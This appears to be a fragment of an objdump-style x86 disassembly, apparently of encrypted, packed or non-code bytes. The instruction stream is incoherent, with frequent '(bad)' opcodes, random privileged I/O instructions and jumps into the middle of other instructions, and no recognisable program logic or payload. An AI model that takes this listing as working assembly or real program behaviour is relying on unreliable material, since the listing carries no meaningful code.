  402887:	nop
  402888:	pop    edi
  402889:	cmp    DWORD PTR [ecx+0x499a1407],0xb
  402890:	sahf   
  402891:	cmp    al,0x8a
  402893:	mov    eax,DWORD PTR [ebx]
  402895:	shr    BYTE PTR ds:0x4b348d6a,cl
  40289b:	push   esp
  40289c:	sti    
  40289d:	iret   
  40289e:	and    BYTE PTR [ecx],0x81
  4028a1:	enter  0xccb7,0x80
  4028a5:	imul   esp,esp,0xc4c6a45
  4028ab:	or     esi,DWORD PTR ds:[esi]
  4028ae:	sbb    ebp,DWORD PTR [ebp+0x48a7c243]
  4028b4:	fadd   DWORD PTR [esi+edx*2]
  4028b7:	std    
  4028b8:	push   0x56
  4028ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028bb:	icebp  
  4028bc:	pusha  
  4028bd:	mov    edi,0x8c055af0
  4028c2:	inc    edx
  4028c3:	mov    eax,0x3369de1f
  4028c8:	push   0xffffff9e
  4028ca:	mov    dh,dh
  4028cc:	(bad)  
  4028cd:	repnz mov ch,0x47
  4028d0:	jl     0x402921
  4028d2:	adc    dl,BYTE PTR ds:0xfc0bcb31
  4028d8:	aam    0x37
  4028da:	cs push ss
  4028dc:	cld    
  4028dd:	bound  edx,QWORD PTR [ebp+0x29cdd3b5]
  4028e3:	push   0x43673d8d
  4028e8:	imul   esp,DWORD PTR [edx+0x3f],0x5b
  4028ec:	cmp    BYTE PTR [esp+ebp*1],dl
  4028ef:	dec    ebx
  4028f0:	lods   al,BYTE PTR ds:[esi]
  4028f1:	nop
  4028f2:	and    BYTE PTR [esi+0x7f],ah
  4028f5:	loop   0x402904
  4028f7:	(bad)  
  4028fa:	or     edi,DWORD PTR [ebx-0x2657b4f4]
  402900:	jno    0x40290f
  402902:	std    
  402903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402904:	test   ah,dl
  402906:	jle    0x4028d5
  402908:	and    ch,0xdd
  40290b:	in     al,dx
  40290c:	js     0x4028bf
  40290e:	clc    
  40290f:	jb     0x402954
  402911:	mov    edi,0x3acd1136
  402916:	ror    BYTE PTR [edx],cl
  402918:	test   eax,0x644cfb91
  40291d:	push   ss
  40291e:	dec    ecx
  40291f:	add    DWORD PTR [edx-0x34],edx
  402922:	lods   al,BYTE PTR ds:[esi]
  402923:	xchg   esi,eax
  402924:	aam    0x17
  402926:	push   0x55
  402928:	stc    
  402929:	popa   
  40292a:	mov    ds:0xaca22c69,eax
  40292f:	mov    dh,0x47
  402931:	jno    0x4029b1
  402933:	test   al,0xa2
  402935:	stos   BYTE PTR es:[edi],al
  402936:	icebp  
  402937:	popa   
  402938:	mov    al,0x50
  40293a:	and    BYTE PTR [edi],dh
  40293c:	mov    DWORD PTR ds:0xa6c87284,0x74d035a6
  402946:	and    eax,ecx
  402948:	mov    edx,0xe604a83b
  40294d:	jae    0x402946
  40294f:	jo     0x4029ac
  402951:	jl     0x40293a
  402953:	or     esi,DWORD PTR [edi+ebx*2+0x2c8d0cfd]
  40295a:	iret   
  40295b:	fild   DWORD PTR [esi*2-0xcc35c72]
  402962:	mov    bl,0xd8
  402964:	pusha  
  402965:	shr    BYTE PTR [ebx+0x4c],0x49
  402969:	sub    eax,0x53d5637e
  40296e:	out    0xb6,eax
  402970:	mov    ebp,0x53866c56
  402975:	pop    eax
  402976:	jb     0x40292f
  402978:	adc    eax,0x9a7974f9
  40297d:	clc    
  40297e:	mov    ebp,0x99c5733
  402983:	xchg   ecx,eax
  402984:	imul   edi,ebx,0x3cb405b1
  40298a:	inc    ebx
  40298b:	sti    
  40298c:	inc    esi
  40298d:	and    BYTE PTR [ebx+0x36],cl
  402990:	cmp    ah,BYTE PTR [ebx]
  402992:	adc    al,0x27
  402994:	fwait
  402995:	cbw    
  402997:	or     dl,ah
  402999:	jne    0x4029e5
  40299b:	mov    ds:0xd7a7a701,al
  4029a0:	adc    edi,DWORD PTR [edi-0x2b4f313e]
  4029a6:	sbb    eax,0xa0e9a0fe
  4029ab:	pop    ebx
  4029ac:	push   ebx
  4029ad:	inc    ecx
  4029ae:	mov    bl,0x2f
  4029b0:	stos   DWORD PTR es:[edi],eax
  4029b1:	jecxz  0x402968
  4029b3:	(bad)  
  4029b4:	sbb    ah,BYTE PTR [ebp+0x600daf50]
  4029ba:	sbb    BYTE PTR [ecx-0x2bdccb82],0x67
  4029c1:	ss or  ebp,esi
  4029c4:	cmp    dh,ch
  4029c6:	je     0x402a35
  4029c8:	push   cs
  4029c9:	jbe    0x4029b0
  4029cb:	ret    
  4029cc:	xor    DWORD PTR ds:0x8e3cba52,edi
  4029d2:	and    BYTE PTR [esi-0x57],bh
  4029d5:	push   ecx
  4029d6:	or     eax,0x63e04ea6
  4029db:	mov    edx,0xbe07cc23
  4029e0:	cmp    ch,BYTE PTR [edi+0x4be24b69]
  4029e6:	(bad)  
  4029e7:	fbstp  TBYTE PTR [ebx+0x72]
  4029ea:	sar    BYTE PTR [edx+esi*8-0x62],0xfe
  4029ef:	inc    edi
  4029f0:	jl     0x402974
  4029f2:	ja     0x4029cb
  4029f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029f5:	pop    ebp
  4029f6:	imul   esp,DWORD PTR [eax+0x79],0x52b52df
  4029fd:	jae    0x40298d
  4029ff:	push   0x7f
  402a01:	dec    eax
  402a02:	div    BYTE PTR [edi-0x29]
  402a05:	xchg   esi,edx
  402a07:	inc    edi
  402a08:	mov    ds,WORD PTR [esi]
  402a0a:	ror    edx,cl
  402a0c:	int    0xb1
  402a0e:	add    dl,BYTE PTR [esi]
  402a10:	repnz dec edi
  402a12:	rcl    DWORD PTR [ebp+0x2b],cl
  402a15:	call   0x2767260
  402a1a:	xor    dh,BYTE PTR [ebx]
  402a1c:	ret    0x5c5e
  402a1f:	addr16 imul esi,ebp,0xffffff8f
  402a23:	and    DWORD PTR [edx],ecx
  402a25:	adc    ebx,esp
  402a27:	jne    0x402a35
  402a29:	loop   0x402a8f
  402a2b:	sbb    DWORD PTR [edx-0x714a5dca],0xdf303d8a
  402a35:	scas   al,BYTE PTR es:[edi]
  402a36:	jl     0x402a04
  402a38:	stc    
  402a39:	jecxz  0x402a85
  402a3b:	jmp    0x402a96
  402a3d:	jg     0x4029c3
  402a3f:	xor    dh,ah
  402a41:	jns    0x402a89
  402a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a44:	fwait
  402a45:	clc    
  402a46:	push   ebp
  402a47:	xor    BYTE PTR ds:0xfe38ced,cl
  402a4d:	out    dx,eax
  402a4e:	int    0xdc
  402a50:	call   0x9638:0xa6a5670c
  402a57:	sub    eax,0x11d92503
  402a5c:	or     eax,esp
  402a5e:	sbb    eax,0xa842838a
  402a63:	xchg   ecx,eax
  402a64:	or     edi,DWORD PTR [esi-0x52]
  402a67:	push   ebp
  402a68:	mov    esi,0xff55f426
  402a6d:	xchg   esp,eax
  402a6e:	je     0x402a09
  402a70:	xchg   esi,eax
  402a71:	and    bh,BYTE PTR [esi+edx*8]
  402a74:	xchg   ebp,eax
  402a75:	loop   0x402a77
  402a77:	inc    ecx
  402a78:	mov    eax,ds:0xf79e4d89
  402a7d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a7f:	sbb    DWORD PTR [edi-0x41],edi
  402a82:	cmp    edi,eax
  402a84:	dec    ebx
  402a85:	sub    eax,0x5f7cac2e
  402a8a:	mov    cl,0xc1
  402a8c:	jbe    0x402aaa
  402a8e:	jo     0x402ad1
  402a90:	sbb    al,0xe1
  402a92:	repz sub ch,BYTE PTR [esi]
  402a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a96:	jmp    0x402ad4
  402a98:	imul   ebx,DWORD PTR [edi+0x5a],0xfffffff2
  402a9c:	cli    
  402a9d:	retf   
  402a9e:	add    BYTE PTR [esi],0x16
  402aa1:	cdq    
  402aa2:	hlt    
  402aa3:	clc    
  402aa4:	int    0x61
  402aa6:	sub    eax,0x1a9fcc6c
  402aab:	cdq    
  402aac:	jmp    FWORD PTR [eax-0x1]
  402aaf:	gs fs push edi
  402ab2:	mov    al,0x8f
  402ab4:	shr    BYTE PTR [ebx-0x50],1
  402ab7:	pushf  
  402ab8:	repz aam 0x27
  402abb:	into   
  402abc:	mov    al,0x81
  402abe:	aas    
  402abf:	int    0xcf
  402ac1:	sub    al,0x9b
  402ac3:	aad    0x9a
  402ac5:	(bad)
  402aca:	(bad)  [ebx+0x79]
  402acd:	adc    bh,BYTE PTR [eax-0x32]
  402ad0:	push   es
  402ad1:	es arpl di,cx
  402ad4:	mov    al,0x8f
  402ad6:	jns    0x402a65
  402ad8:	sbb    al,ch
  402ada:	or     eax,0x7aaadfa9
  402adf:	jae    0x402af6
  402ae1:	push   edi
  402ae2:	(bad)
  402ae5:	push   ebx
  402ae6:	test   DWORD PTR es:[eax],ebp
  402ae9:	ins    DWORD PTR es:[edi],dx
  402aea:	push   0x90b0753b
  402aef:	dec    ebp
  402af0:	out    dx,al
  402af1:	jg     0x402b08
  402af3:	pop    ebp
  402af4:	popa   
  402af5:	mov    cl,0x11
  402af7:	cmc    
  402af8:	xchg   ecx,eax
  402af9:	ja     0x402b10
  402afb:	inc    edi
  402afc:	inc    ebx
  402afd:	scas   eax,DWORD PTR es:[edi]
  402afe:	sub    eax,0xf3bbd925
  402b03:	mov    esp,0xfddad127
  402b08:	cmp    eax,0xbf3a1798
  402b0d:	and    BYTE PTR [edx-0x28544333],ah
  402b13:	stc    
  402b14:	stc    
  402b15:	ret    
  402b16:	dec    esp
  402b17:	cmp    BYTE PTR [ecx+0x4b],bh
  402b1a:	mov    edi,0x3ce09bec
  402b1f:	xchg   ebp,eax
  402b20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b21:	push   cs
  402b22:	(bad)  
  402b24:	out    dx,al
  402b25:	cmc    
  402b26:	xor    ch,bl
  402b28:	mov    bl,0xd7
  402b2a:	(bad)  
  402b2c:	ret    0xad43
  402b2f:	push   ss
  402b30:	xchg   ebp,eax
  402b31:	xor    eax,0x55ef069f
  402b36:	pop    eax
  402b37:	xchg   ecx,eax
  402b38:	aas    
  402b39:	out    0x78,eax
  402b3b:	push   eax
  402b3c:	mov    esp,0x49f0d97c
  402b41:	addr16 call 0xd6cd:0x93d633fb
  402b49:	lock jno 0xeca29817
  402b50:	sbb    BYTE PTR [eax+0x3f],ch
  402b53:	ret    
  402b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b55:	inc    edx
  402b56:	mov    ah,BYTE PTR [ecx]
  402b58:	out    dx,eax
  402b59:	jns    0x402b8c
  402b5b:	gs cwde 
  402b5d:	add    BYTE PTR [edx],cl
  402b5f:	xchg   ch,bl
  402b61:	push   ecx
  402b62:	push   esp
  402b63:	xor    DWORD PTR [edi+0x5170210d],edx
  402b69:	addr16 mov ds:0x9607,al
  402b6d:	daa    
  402b6e:	jp     0x402bbf
  402b70:	lds    ecx,FWORD PTR [edi]
  402b72:	inc    edx
  402b73:	call   0xd5a3:0xdd87443d
  402b7a:	lahf   
  402b7b:	cmp    ah,BYTE PTR [ecx-0x52]
  402b7e:	and    al,0x79
  402b80:	push   es
  402b81:	shl    DWORD PTR [edx-0x35],cl
  402b84:	jbe    0x402b86
  402b86:	outs   dx,BYTE PTR ds:[esi]
  402b87:	(bad)  
  402b88:	(bad)  
  402b89:	pushf  
  402b8a:	out    0xaf,eax
  402b8c:	inc    ebx
  402b8d:	push   ebx
  402b8e:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  402b90:	xor    al,0x67
  402b92:	into   
  402b93:	cmp    DWORD PTR [ebp+0x58780193],0xf148423c
  402b9d:	lods   eax,DWORD PTR ds:[esi]
  402b9e:	into   
  402b9f:	scas   eax,DWORD PTR es:[edi]
  402ba0:	jecxz  0x402c10
  402ba2:	cmp    al,0x64
  402ba4:	lahf   
  402ba5:	fcom   st(2)
  402ba7:	adc    DWORD PTR [eax+eax*4],ebx
  402baa:	shl    BYTE PTR [ecx],1
  402bac:	xlat   BYTE PTR ds:[ebx]
  402bad:	mov    cl,0xe1
  402baf:	repz add BYTE PTR [edx],0x4a
  402bb3:	mov    ch,dl
  402bb5:	push   esp
  402bb6:	sub    edx,eax
  402bb8:	jae    0x402bce
  402bba:	sbb    bh,al
  402bbc:	mov    al,gs:0x1832c383
  402bc2:	jns    0x402b5d
  402bc4:	in     al,0x83
  402bc6:	adc    al,0x3d
  402bc8:	jno    0x402bd0
  402bca:	rcr    ebx,0x6d
  402bcd:	pop    ds
  402bce:	mov    dl,0x1f
  402bd0:	lea    esp,[esi]
  402bd2:	jbe    0x402c0e
  402bd4:	cmp    BYTE PTR [eax+0x257213f7],dh
  402bda:	fist   DWORD PTR [esi*2-0x4e1b5a6e]
  402be1:	mov    bl,0x40
  402be3:	out    dx,al
  402be4:	sbb    al,BYTE PTR [edi+ebp*2]
  402be7:	test   BYTE PTR [ebx-0x6de374a3],bl
  402bed:	sub    DWORD PTR [ecx-0x33],eax
  402bf0:	jb     0x402c48
  402bf2:	push   edx
  402bf3:	ins    DWORD PTR es:[edi],dx
  402bf4:	mov    ebp,0xc8179a6e
  402bf9:	fcmovnbe st,st(7)
  402bfb:	(bad)  
  402bfc:	fnstsw WORD PTR [edi-0xef51f27]
  402c02:	jmp    0xef73:0x89099abc
  402c09:	pop    edi
  402c0a:	fsubr  DWORD PTR ds:0xefbdbd5a
  402c10:	pop    esi
  402c11:	loope  0x402ba7
  402c13:	test   DWORD PTR [esi-0x68c7cf3e],0x2844c5f8
  402c1d:	jle    0x402c65
  402c1f:	sbb    ebx,esi
  402c21:	loopne 0x402bc9
  402c23:	loope  0x402ba8
  402c25:	lahf   
  402c26:	pop    ebp
  402c27:	xlat   BYTE PTR ds:[ebx]
  402c28:	mov    edi,0x2940018
  402c2d:	add    ch,al
  402c2f:	jle    0x402c6d
  402c31:	xchg   ecx,eax
  402c32:	fld    QWORD PTR [esi]
  402c34:	and    eax,0x4ac8493f
  402c39:	mov    ds:0x9669f96a,eax
  402c3e:	adc    DWORD PTR [edi+ebx*1-0x1a0e52f7],ecx
  402c45:	mov    esi,0x30f28145
  402c4a:	xor    al,0x34
  402c4c:	xchg   esp,eax
  402c4d:	out    dx,al
  402c4e:	ret    
  402c4f:	inc    ecx
  402c50:	inc    edi
  402c51:	retf   
  402c52:	push   ebp
  402c53:	cmp    DWORD PTR [ecx-0x501ddbe5],esi
  402c59:	rcr    BYTE PTR [eax+0x68],1
  402c5c:	or     DWORD PTR [edx+0x5cbe27e6],ebx
  402c62:	les    edi,FWORD PTR [eax+0x68c19315]
  402c68:	imul   edx,edi,0xffffffda
  402c6b:	loop   0x402c96
  402c6d:	ins    DWORD PTR es:[edi],dx
  402c6e:	or     BYTE PTR [eax-0x38],ch
  402c71:	dec    ebp
  402c72:	std    
  402c73:	repz or al,0x31
  402c76:	jo     0x402c97
  402c78:	adc    BYTE PTR [edx+eax*2-0x2a],ah
  402c7c:	ret    
  402c7d:	dec    eax
  402c7e:	push   ebx
  402c7f:	leave  
  402c80:	mov    WORD PTR [ebx-0x75],gs
  402c83:	add    ebp,edi
  402c85:	sbb    eax,0xa8936dc7
  402c8a:	mov    ecx,0xde02e660
  402c8f:	js     0x402c91
  402c91:	or     DWORD PTR [edi-0x3f],edi
  402c94:	ret    0xacf1
  402c97:	jmp    0x22f0def0
  402c9c:	je     0x402c62
  402c9e:	pop    edi
  402c9f:	(bad)  
  402ca0:	bound  edx,QWORD PTR [edi+edx*4+0x1d]
  402ca4:	mov    ?,edi
  402ca6:	ret    
  402ca7:	inc    edx
  402ca8:	fistp  QWORD PTR [edi+0xb]
  402cab:	paddusw mm1,QWORD PTR [ebp+0x58]
  402caf:	inc    esi
  402cb0:	scas   eax,DWORD PTR es:[edi]
  402cb1:	inc    ecx
  402cb2:	stos   DWORD PTR es:[edi],eax
  402cb3:	pop    edx
  402cb4:	and    BYTE PTR [edi-0x4e8facd],ah
  402cba:	out    0x3b,eax
  402cbc:	lahf   
  402cbd:	mov    ecx,es
  402cbf:	jno    0x402d0b
  402cc1:	das    
  402cc2:	cli    
  402cc3:	pop    es
  402cc4:	and    BYTE PTR [esi],ah
  402cc6:	aas    
  402cc7:	int3   
  402cc8:	dec    esp
  402cc9:	rcl    BYTE PTR [esi],1
  402ccb:	push   ebx
  402ccc:	sti    
  402ccd:	into   
  402cce:	retf   0xf1aa
  402cd1:	mov    ebp,0x95977f86
  402cd6:	shl    ah,cl
  402cd8:	not    DWORD PTR ds:0x4736cc4d
  402cde:	addr16 mov edx,0xd05402bd
  402ce4:	jbe    0x402d14
  402ce6:	addr16 push es
  402ce8:	call   0x7e1a:0x87c017f1
  402cef:	loopne 0x402ce6
  402cf1:	jp     0x402c75
  402cf3:	or     eax,0xf1467cdd
  402cf8:	add    eax,0xfdd73a1f
  402cfd:	mov    ds:0xc1c04c05,al
  402d02:	and    al,BYTE PTR [edx+0x2ec1f4bb]
  402d08:	jb     0x402c9d
  402d0a:	mov    esi,0x20e0378f
  402d0f:	xchg   ecx,eax
  402d10:	or     BYTE PTR [ebx-0x2f307074],0x63
  402d17:	fstp   DWORD PTR [eax]
  402d19:	cdq    
  402d1a:	enter  0x70fd,0x51
  402d1e:	call   0x8b49:0x158f0c98
  402d25:	(bad)  
  402d26:	mov    bh,0xdd
  402d28:	inc    eax
  402d29:	out    dx,al
  402d2a:	(bad)  
  402d2b:	xlat   BYTE PTR ds:[ebx]
  402d2c:	add    ebx,esi
  402d2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d30:	std    
  402d31:	cdq    
  402d32:	aam    0x5
  402d34:	int    0x44
  402d36:	lea    ebx,[edi-0x12]
  402d39:	retf   0xdb54
  402d3c:	or     eax,0x6465ea94
  402d41:	je     0x402ce6
  402d43:	popf   
  402d44:	and    eax,0x17231211
  402d49:	stc    
  402d4a:	pop    esp
  402d4b:	in     eax,dx
  402d4c:	retf   0xc1e3
  402d4f:	(bad)  
  402d50:	ds sub al,0xf8
  402d53:	retf   
  402d54:	fwait
  402d55:	xchg   ebp,eax
  402d56:	mov    ecx,0x991c751d
  402d5b:	fs push eax
  402d5d:	cwde   
  402d5e:	add    BYTE PTR [edi+ebp*4],0x74
  402d62:	xchg   edx,eax
  402d63:	pop    edi
  402d64:	sub    eax,DWORD PTR [ebp-0x34]
  402d67:	loopne 0x402d46
  402d69:	loopne 0x402d67
  402d6b:	inc    eax
  402d6c:	mov    ebp,0x3295df34
  402d71:	inc    eax
  402d72:	nop
  402d73:	bnd jo 0x402d46
  402d76:	xor    eax,0x43cc9045
  402d7b:	cs push ecx
  402d7d:	adc    DWORD PTR [ecx+edi*2+0x49da97dc],edi
  402d84:	lea    ecx,[eax-0x2e]
  402d87:	jge    0x402dc0
  402d89:	or     al,0x6c
  402d8b:	out    dx,eax
  402d8c:	inc    ecx
  402d8d:	pop    esi
  402d8e:	pop    esi
  402d8f:	ret    0xc9cf
  402d92:	adc    DWORD PTR [eax+0x35],edx
  402d95:	fcom   DWORD PTR [ebx+0x58f9e83f]
  402d9b:	mov    ds:0x11a00d38,al
  402da0:	sub    edx,DWORD PTR [eax+0x53a9c7c1]
  402da6:	ins    BYTE PTR es:[edi],dx
  402da7:	aad    0x2c
  402da9:	xor    ch,BYTE PTR [eax]
  402dab:	std    
  402dac:	inc    esp
  402dad:	in     eax,0xdc
  402daf:	lea    edx,gs:[ebx+0x65]
  402db3:	fstp   TBYTE PTR [ebp+0x57]
  402db6:	int3   
  402db7:	cmp    BYTE PTR [edx+edx*2-0x80],ch
  402dbb:	or     DWORD PTR [ebp+ebx*8-0x5c71e513],esp
  402dc2:	add    ah,BYTE PTR [esi-0x64ea8324]
  402dc8:	inc    edi
  402dc9:	mov    DWORD PTR [edi-0x80],0xe9c06249
  402dd0:	mov    edx,0xb4ccf3e3
  402dd5:	pop    edx
  402dd6:	rcl    BYTE PTR [esi+0x642a2bd2],cl
  402ddc:	sbb    BYTE PTR [esi],cl
  402dde:	cmp    esi,ecx
  402de0:	pop    eax
  402de1:	jo     0x402e62
  402de3:	sbb    DWORD PTR [esi-0x77],ecx
  402de6:	mov    edi,DWORD PTR [ecx+0x27]
  402de9:	or     al,0x32
  402deb:	adc    ebx,eax
  402ded:	and    BYTE PTR [ebp+0x3f],0x7b
  402df1:	pop    ds
  402df2:	push   cs
  402df3:	mov    esp,0xa39611bd
  402df8:	xor    eax,0x51ec2633
  402dfd:	shr    DWORD PTR [esi+ecx*4],cl
  402e00:	test   ecx,0x2b980430
  402e06:	inc    edx
  402e07:	or     eax,DWORD PTR [edx]
  402e09:	cld    
  402e0a:	add    BYTE PTR [edi+0xaa42824],dh
  402e10:	imul   eax,DWORD PTR [edx+0x6365dff9],0xf
  402e17:	test   DWORD PTR ds:0x8f4b9d5b,esp
  402e1d:	mov    edx,0x330d860c
  402e22:	xchg   edx,eax
  402e23:	retf   0x71a0
  402e26:	std    
  402e27:	add    DWORD PTR [edx+ecx*4-0x741b794f],ecx
  402e2e:	dec    ebp
  402e2f:	jae    0x402e31
  402e31:	test   al,0xfd
  402e33:	xor    dh,BYTE PTR [eax+0x72]
  402e36:	addr16 pop edx
  402e38:	inc    ebp
  402e39:	fnstcw WORD PTR [ecx+ebx*4]
  402e3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e3d:	loope  0x402dee
  402e3f:	aam    0xab
  402e41:	or     DWORD PTR [esi+0x56],ebx
  402e44:	pop    esi
  402e45:	mov    esi,0x69466b50
  402e4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e4b:	sbb    al,BYTE PTR [ebp+ebx*4+0x2330e4b0]
  402e52:	lods   al,BYTE PTR ds:[esi]
  402e53:	pop    ds
  402e54:	ret    
  402e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e56:	les    edi,FWORD PTR [ebp+ecx*4-0x1164013]
  402e5d:	mov    dh,0x3d
  402e5f:	repz or BYTE PTR [edi-0x627344fa],dl
  402e66:	cmp    BYTE PTR [edx+ecx*2+0x1b],ch
  402e6a:	addr16 mov cl,0x73
  402e6d:	inc    ebx
  402e6e:	mul    esp
  402e70:	aaa    
  402e71:	jp     0x402eb2
  402e73:	xchg   esi,eax
  402e74:	mov    ebx,0x3acb5567
  402e79:	fild   QWORD PTR [ebp+0x26]
  402e7c:	rcr    dh,0x10
  402e7f:	mov    bh,0xdc
  402e81:	sbb    dh,BYTE PTR [ecx-0x67]
  402e84:	xor    dh,BYTE PTR [ebx+0x77]
  402e87:	jecxz  0x402e38
  402e89:	in     al,dx
  402e8a:	enter  0xe3d2,0xa9
  402e8e:	dec    ebx
  402e8f:	cmc    
  402e90:	mov    gs,WORD PTR [edx+0xafdc47a]
  402e96:	mov    DWORD PTR [ecx-0x4f],ebp
  402e99:	add    bl,BYTE PTR [edx+0x58181c2b]
  402e9f:	mov    ah,0xd8
  402ea1:	ret    0xaf79
  402ea4:	sahf   
  402ea5:	rcl    DWORD PTR [eax+0x5e024198],cl
  402eab:	xchg   esi,eax
  402eac:	and    DWORD PTR [ebx-0x2f],edx
  402eaf:	and    dl,BYTE PTR [ebx+0x38]
  402eb2:	push   ds
  402eb3:	and    BYTE PTR [ebx+0x21b2868b],dh
  402eb9:	mov    bh,ch
  402ebb:	mov    cl,0x6e
  402ebd:	add    dl,BYTE PTR [eax+0x24d403c3]
  402ec3:	lds    esi,FWORD PTR [eax-0x11]
  402ec6:	shr    DWORD PTR [esi-0x4a],cl
  402ec9:	loop   0x402ee9
  402ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ecc:	jge    0x402e55
  402ece:	add    BYTE PTR [ebx+0x37],cl
  402ed1:	jl     0x402f39
  402ed3:	test   BYTE PTR [edx+0x1c903e39],cl
  402ed9:	or     DWORD PTR [edx+0x4c],ecx
  402edc:	or     eax,0xb17b1655
  402ee1:	pop    ecx
  402ee2:	inc    ebp
  402ee3:	into   
  402ee4:	sahf   
  402ee5:	or     edi,DWORD PTR [eax+0x5524a7b8]
  402eeb:	stos   DWORD PTR es:[edi],eax
  402eec:	ss das 
  402eee:	add    eax,0xbfb9b6c
  402ef3:	loop   0x402ef4
  402ef5:	stc    
  402ef6:	std    
  402ef7:	sbb    al,0x15
  402ef9:	mov    edx,0x8385e5b5
  402efe:	mov    eax,ds:0x3982626
  402f03:	pop    esi
  402f04:	xor    dh,BYTE PTR [esi]
  402f06:	mov    ah,0x32
  402f08:	adc    edi,DWORD PTR [ebp-0x3d]
  402f0b:	mov    ah,0x17
  402f0d:	ror    DWORD PTR [edi+0x70],0x74
  402f11:	sbb    al,0xe5
  402f13:	inc    eax
  402f14:	cmp    DWORD PTR [eax],edx
  402f16:	xor    DWORD PTR [esi-0x10da3d8c],eax
  402f1c:	stos   DWORD PTR es:[edi],eax
  402f1d:	(bad)  
  402f1e:	scas   al,BYTE PTR es:[edi]
  402f1f:	fidiv  WORD PTR [edx-0x6e776aab]
  402f25:	add    al,0xdb
  402f27:	cmp    ch,BYTE PTR ds:0x30ff5a17
  402f2d:	inc    edx
  402f2e:	fist   WORD PTR [ebp-0x32]
  402f31:	out    0x6d,eax
  402f33:	push   eax
  402f34:	ins    BYTE PTR es:[edi],dx
  402f35:	pop    ds
  402f36:	cmp    ebx,DWORD PTR [ebx]
  402f38:	(bad)  
  402f3a:	xor    al,0x1
  402f3c:	pusha  
  402f3d:	dec    eax
  402f3e:	das    
  402f3f:	sar    ebp,1
  402f41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f42:	cdq    
  402f43:	aas    
  402f44:	jne    0x402f5f
  402f46:	dec    esp
  402f47:	scas   al,BYTE PTR es:[edi]
  402f48:	and    al,BYTE PTR [esi]
  402f4a:	cmp    DWORD PTR [ebx+0x5b],0xa492a810
  402f51:	lea    edi,[edi]
  402f53:	les    edi,FWORD PTR [eax-0x43cea811]
  402f59:	loope  0x402f2f
  402f5b:	call   0x87a33d0d
  402f60:	std    
  402f61:	mov    ecx,0xd50cba27
  402f66:	fild   WORD PTR [ecx-0xa]
  402f69:	adc    al,0x33
  402f6b:	mov    ds:0x6ca6130e,eax
  402f70:	inc    ebp
  402f71:	jle    0x402ef4
  402f73:	dec    ebx
  402f74:	iret   
  402f75:	imul   edi,DWORD PTR [ecx],0xffffffdf
  402f78:	ja     0x402f4a
  402f7a:	outs   dx,DWORD PTR ds:[esi]
  402f7b:	dec    ebp
  402f7c:	fs jg  0x402eff
  402f7f:	mov    ecx,0xdb5dc33
  402f84:	mov    ds:0xbdc894e4,al
  402f89:	ja     0x402fe9
  402f8b:	push   0xe1b3c146
  402f90:	xor    ebp,DWORD PTR [ebp-0x12]
  402f93:	sahf   
  402f94:	adc    eax,0x70e07952
  402f99:	inc    edi
  402f9a:	pop    edi
  402f9b:	aam    0x65
  402f9d:	jo     0x402f83
  402f9f:	imul   esi,DWORD PTR [edx-0x5d5cab5f],0x362cede3
  402fa9:	push   cs
  402faa:	dec    ebx
  402fab:	add    BYTE PTR [eax+esi*1-0x18],cl
  402faf:	sub    ecx,DWORD PTR [ecx]
  402fb1:	jo     0x402f84
  402fb3:	pushf  
  402fb4:	cs mov cl,0x4b
  402fb7:	adc    BYTE PTR [ecx],cl
  402fb9:	jl     0x402fd3
  402fbb:	mov    bl,0xc9
  402fbd:	dec    edx
  402fbe:	mov    ds:0x48646295,eax
  402fc3:	push   0x2279903a
  402fc8:	xor    esi,DWORD PTR [esi-0x68f76bce]
  402fce:	mov    ebx,0xf51faea9
  402fd3:	sbb    DWORD PTR [ebx],edx
  402fd5:	jbe    0x403038
  402fd7:	pushf  
  402fd8:	sbb    eax,0xcd180531
  402fdd:	add    BYTE PTR [esi+0x6b],bh
  402fe0:	pop    ebp
  402fe1:	repz call DWORD PTR ds:0xcad38762
  402fe8:	stos   DWORD PTR es:[edi],eax
  402fe9:	loopne 0x403027
  402feb:	mov    eax,0xa18e1539
  402ff0:	scas   al,BYTE PTR es:[edi]
  402ff1:	jbe    0x402f84
  402ff3:	popf   
  402ff4:	mov    ch,0x70
  402ff6:	cmc    
  402ff7:	fmul   st(0),st
  402ff9:	fsubr  DWORD PTR [ecx]
  402ffb:	push   ebp
  402ffc:	icebp  
  402ffd:	sub    eax,0xa48aabd0
  403002:	pop    edx
  403003:	mov    ?,WORD PTR [ecx-0x21]
  403006:	shr    DWORD PTR [ebp-0x3c],cl
  403009:	push   edi
  40300a:	jg     0x402f98
  40300c:	in     eax,dx
  40300d:	cmp    BYTE PTR [ebx-0x3420df25],ah
  403013:	aam    0x14
  403015:	adc    al,BYTE PTR [edi]
  403017:	mul    BYTE PTR [edi+0x3ec12ba]
  40301d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40301e:	mov    bh,cl
  403020:	out    0x2f,al
  403022:	sbb    eax,esi
  403024:	inc    eax
  403025:	pop    ebx
  403026:	and    eax,0x58f4389b
  40302b:	jp     0x403007
  40302d:	pop    ebx
  40302e:	sub    eax,0xaf25aeaf
  403033:	in     al,0x1e
  403035:	jb     0x403058
  403037:	mov    eax,?
  403039:	arpl   di,si
  40303b:	cli    
  40303c:	pop    edx
  40303d:	gs xchg ecx,eax
  40303f:	jns    0x403013
  403041:	jle    0x40308f
  403043:	shl    BYTE PTR [edx+0x61],1
  403046:	cmp    eax,0xc5bf133e
  40304b:	xchg   ecx,eax
  40304c:	ins    BYTE PTR es:[edi],dx
  40304d:	mov    al,0xbe
  40304f:	jmp    DWORD PTR [eax+0x217dc32a]
  403055:	call   0xfda0c2b2
  40305a:	add    al,0x85
  40305c:	mov    dh,0x39
